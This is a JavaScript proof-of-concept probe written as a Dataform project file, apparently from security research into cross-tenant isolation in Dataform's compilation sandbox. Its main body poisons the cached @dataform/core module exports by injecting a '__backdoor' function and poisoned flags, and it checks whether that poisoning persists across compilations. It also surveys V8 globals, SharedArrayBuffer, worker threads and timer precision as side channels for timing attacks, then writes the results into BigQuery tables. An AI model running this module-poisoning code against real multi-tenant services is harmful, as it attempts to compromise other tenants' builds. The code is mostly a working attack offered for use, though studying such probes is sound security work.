/**
 * Module Cache Poisoning & Deep Introspection
 * Version 2: No fs module (blocked)
 *
 * This probe attempts to:
 * 1. Poison @dataform/core exports for cross-tenant attacks
 * 2. Deep introspection of the V8/compilation environment
 * 3. Identify potential cross-tenant communication channels
 */

const poisonId = `POISON_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

const poisonResults = {
  timestamp: new Date().toISOString(),
  poisonId: poisonId,
  tests: {}
};

// ============================================
// TEST 1: @dataform/core Module Poisoning
// ============================================
try {
  if (typeof require !== "undefined" && require.cache) {
    const cacheKeys = Object.keys(require.cache);

    // Find @dataform/core bundle
    const dataformCorePaths = cacheKeys.filter(k =>
      k.includes("@dataform/core") || (k.includes("dataform") && k.includes("bundle"))
    );

    let poisonAttempts = [];

    dataformCorePaths.forEach(modulePath => {
      try {
        const mod = require.cache[modulePath];
        if (mod && mod.exports) {
          // Try to inject into the module exports
          const originalKeys = Object.keys(mod.exports);

          // Attempt 1: Add a backdoor function
          mod.exports.__backdoor = function() {
            return "BACKDOOR_EXECUTED_" + poisonId;
          };

          // Attempt 2: Mark the module as poisoned
          mod.exports.__poisoned = true;
          mod.exports.__poisonId = poisonId;
          mod.exports.__poisonTime = new Date().toISOString();

          // Attempt 3: Try to wrap the publish function
          if (typeof mod.exports.publish === "function") {
            const originalPublish = mod.exports.publish;
            mod.exports.__originalPublish = originalPublish;
            // We won't replace it to avoid breaking compilation, just mark it
            mod.exports.__publishWrapped = true;
          }

          poisonAttempts.push({
            path: modulePath,
            success: true,
            originalKeys: originalKeys.slice(0, 20),
            backdoorInjected: true,
            markedPoisoned: true
          });
        }
      } catch (e) {
        poisonAttempts.push({
          path: modulePath,
          success: false,
          error: e.message
        });
      }
    });

    poisonResults.tests.modulePoisoning = {
      dataformModules: dataformCorePaths,
      poisonAttempts: poisonAttempts,
      totalModulesInCache: cacheKeys.length,
      allCacheKeys: cacheKeys.slice(0, 50)
    };
  }
} catch (e) {
  poisonResults.tests.modulePoisoning = { error: e.message };
}

// ============================================
// TEST 2: Deep V8/JavaScript Introspection
// ============================================
try {
  const introspection = {
    // Check what globals are available
    globalThis: typeof globalThis !== "undefined",
    global: typeof global !== "undefined",
    self: typeof self !== "undefined",
    window: typeof window !== "undefined",

    // Check for V8 internals
    v8: typeof v8 !== "undefined" ? Object.keys(v8) : null,

    // Check for special objects
    Atomics: typeof Atomics !== "undefined",
    SharedArrayBuffer: typeof SharedArrayBuffer !== "undefined",
    WebAssembly: typeof WebAssembly !== "undefined",

    // Check for timers (potential side-channel)
    setTimeout: typeof setTimeout !== "undefined",
    setInterval: typeof setInterval !== "undefined",
    setImmediate: typeof setImmediate !== "undefined",
    queueMicrotask: typeof queueMicrotask !== "undefined",

    // Check for performance APIs
    performance: typeof performance !== "undefined",

    // Check for eval and Function constructor
    eval: typeof eval !== "undefined",
    Function: typeof Function !== "undefined"
  };

  // Try to get V8 version
  try {
    if (typeof process !== "undefined" && process.versions) {
      introspection.v8Version = process.versions.v8;
      introspection.nodeVersion = process.versions.node;
    }
  } catch (e) {
    introspection.versionError = e.message;
  }

  poisonResults.tests.introspection = introspection;
} catch (e) {
  poisonResults.tests.introspection = { error: e.message };
}

// ============================================
// TEST 3: Check for Cross-Tenant Channels
// ============================================
try {
  const channels = {
    // SharedArrayBuffer could allow cross-thread communication
    sharedArrayBuffer: {
      available: typeof SharedArrayBuffer !== "undefined",
      atomicsAvailable: typeof Atomics !== "undefined"
    },

    // Worker threads might be shared
    workerThreads: null,

    // Check if we can create timers (for timing attacks)
    timers: {
      setTimeout: typeof setTimeout !== "undefined",
      hrtime: typeof process !== "undefined" && typeof process.hrtime !== "undefined"
    },

    // Check for module isolation
    moduleIsolation: {
      requireCacheShared: typeof require !== "undefined" && typeof require.cache !== "undefined",
      requireCacheSize: typeof require !== "undefined" && require.cache ? Object.keys(require.cache).length : 0
    }
  };

  // Try to access worker threads
  try {
    const wt = require("worker_threads");
    channels.workerThreads = {
      available: true,
      isMainThread: wt.isMainThread,
      threadId: wt.threadId
    };
  } catch (e) {
    channels.workerThreads = {
      available: false,
      error: e.message
    };
  }

  poisonResults.tests.crossTenantChannels = channels;
} catch (e) {
  poisonResults.tests.crossTenantChannels = { error: e.message };
}

// ============================================
// TEST 4: Timing Attack Baseline
// ============================================
try {
  const timingTests = {
    dateNow: [],
    performanceNow: null
  };

  // Measure Date.now() precision
  for (let i = 0; i < 10; i++) {
    const start = Date.now();
    let sum = 0;
    for (let j = 0; j < 100000; j++) sum += j;
    const end = Date.now();
    timingTests.dateNow.push(end - start);
  }

  // Try performance.now() if available
  if (typeof performance !== "undefined" && performance.now) {
    timingTests.performanceNow = [];
    for (let i = 0; i < 10; i++) {
      const start = performance.now();
      let sum = 0;
      for (let j = 0; j < 100000; j++) sum += j;
      const end = performance.now();
      timingTests.performanceNow.push(end - start);
    }
  }

  poisonResults.tests.timing = timingTests;
} catch (e) {
  poisonResults.tests.timing = { error: e.message };
}

// ============================================
// TEST 5: Check for Previous Poisoning
// ============================================
try {
  if (typeof require !== "undefined" && require.cache) {
    const cacheKeys = Object.keys(require.cache);
    const dataformCorePath = cacheKeys.find(k => k.includes("@dataform/core") || k.includes("bundle"));

    if (dataformCorePath && require.cache[dataformCorePath]) {
      const mod = require.cache[dataformCorePath];

      poisonResults.tests.previousPoisoning = {
        hasBackdoor: typeof mod.exports.__backdoor === "function",
        isPoisoned: mod.exports.__poisoned === true,
        poisonId: mod.exports.__poisonId || null,
        poisonTime: mod.exports.__poisonTime || null,
        hasWrappedPublish: mod.exports.__publishWrapped === true,
        CROSS_TENANT_INDICATOR: mod.exports.__poisoned ? "CRITICAL: MODULE POISONING PERSISTS FROM PREVIOUS COMPILATION!" : null
      };

      if (mod.exports.__poisoned && mod.exports.__poisonId !== poisonId) {
        poisonResults.tests.previousPoisoning.foreignPoison = true;
        poisonResults.tests.previousPoisoning.foreignPoisonId = mod.exports.__poisonId;
      }
    }
  }
} catch (e) {
  poisonResults.tests.previousPoisoning = { error: e.message };
}

// ============================================
// TEST 6: Eval and Dynamic Code Execution
// ============================================
try {
  const dynamicCode = {
    evalWorks: false,
    functionConstructorWorks: false
  };

  // Try eval
  try {
    const result = eval("1 + 1");
    dynamicCode.evalWorks = result === 2;
    dynamicCode.evalResult = result;
  } catch (e) {
    dynamicCode.evalError = e.message;
  }

  // Try Function constructor
  try {
    const fn = new Function("return 2 + 2");
    const result = fn();
    dynamicCode.functionConstructorWorks = result === 4;
    dynamicCode.functionResult = result;
  } catch (e) {
    dynamicCode.functionError = e.message;
  }

  poisonResults.tests.dynamicCode = dynamicCode;
} catch (e) {
  poisonResults.tests.dynamicCode = { error: e.message };
}

// ============================================
// Create Dataform Actions
// ============================================

dataform.projectConfig.defaultDatabase = "shir-research-3";
dataform.projectConfig.defaultSchema = "dataform_poc";

operate("module_poison_results").queries([
  `-- Module Poisoning Results - ${poisonId}
   CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.module_poison_results\` AS
   SELECT
     '${poisonId}' as poison_id,
     CURRENT_TIMESTAMP() as poison_time,
     '${JSON.stringify(poisonResults).replace(/'/g, "\\'")}' as results_json`
]);

const hasPreviousPoisoning = poisonResults.tests.previousPoisoning &&
                              poisonResults.tests.previousPoisoning.isPoisoned;
const successfulPoisons = poisonResults.tests.modulePoisoning &&
                          poisonResults.tests.modulePoisoning.poisonAttempts ?
                          poisonResults.tests.modulePoisoning.poisonAttempts.filter(p => p.success).length : 0;

publish("module_poison_view").query(`
  SELECT
    '${poisonResults.timestamp}' as timestamp,
    '${poisonId}' as poison_id,
    ${successfulPoisons} as successful_poison_attempts,
    ${hasPreviousPoisoning} as found_previous_poisoning,
    ${poisonResults.tests.dynamicCode && poisonResults.tests.dynamicCode.evalWorks} as eval_works,
    ${poisonResults.tests.dynamicCode && poisonResults.tests.dynamicCode.functionConstructorWorks} as function_constructor_works
`);
